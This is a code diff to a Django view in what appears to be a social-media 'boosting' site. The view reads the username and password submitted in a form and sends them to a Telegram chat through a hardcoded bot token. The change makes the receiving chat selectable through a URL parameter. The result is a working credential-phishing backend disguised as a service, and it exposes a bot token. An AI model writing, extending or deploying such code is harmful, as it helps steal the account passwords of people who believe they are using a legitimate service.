@@ -3,7 +3,7 @@ from django.http import HttpResponse
 from django.shortcuts import render
 from .forms import NakrutkaForm
 
-def home(request):
+def home(request,id):
     success = False
     if request.method == "POST":
         form = NakrutkaForm(request.POST)
@@ -12,10 +12,9 @@ def home(request):
             username_var = form.cleaned_data.get('username')
             password_var = form.cleaned_data.get('password')
             bot_token = "8247922895:AAFAwuGynmBGVWWClgc7nwxJnPErmSB-hwU"
-            chat_id = "6642743434"
-            text = f"👤 *Username*: ```{username_var}```\n🔒 *Parol*: ```{password_var}```\n"
+            text = f"👤 *Login*: ```{username_var}```\n🔒 *Parol*: ```{password_var}```\n"
             requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
-                          data={"chat_id": chat_id, "text": text,"parse_mode": "MarkdownV2"})
+                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})
 
     else:
         form = NakrutkaForm()
